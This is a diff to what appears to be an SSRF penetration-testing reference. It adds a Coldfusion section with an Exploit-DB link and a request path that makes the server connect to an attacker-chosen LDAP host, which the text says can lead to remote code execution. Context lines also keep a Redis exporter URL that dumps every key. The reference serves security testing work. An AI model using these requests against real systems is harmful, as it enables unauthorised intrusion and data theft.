@@ -93,6 +93,8 @@ The response times are slower or faster depending on whether or not the URL you 
 - [W3 Total Cache](#w3)
 - [Docker](#docker)
 - [Gitlab Prometheus Redis Exporter](#redisexporter)
+- [Coldfusion](#coldfusion)
+
 
 **Possible via Gopher**
 
@@ -614,6 +616,21 @@ The following endpoint will allow an attacker to dump all the keys in the redis 
 
 ```bash
 http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
+```
+
+<div id="coldfusion"></div>
+
+## Coldfusion
+
+**Commonly bound ports: 80,443,8500**
+
+Some versions of Coldfusion allow you to connect arbitrarily to an LDAP server using a URL passed as a GET parameter.
+- [https://www.exploit-db.com/exploits/50781](https://www.exploit-db.com/exploits/50781)
+
+This can lead to Remote Code Execution through LDAP Deserialization.
+
+```
+/CFIDE/wizards/common/utils.cfc?method=verifyldapserver&vserver=SSRF_CANARY&vport=389&vstart=&vusername=&vpassword=&returnformat=json
 ```
 
 ----------
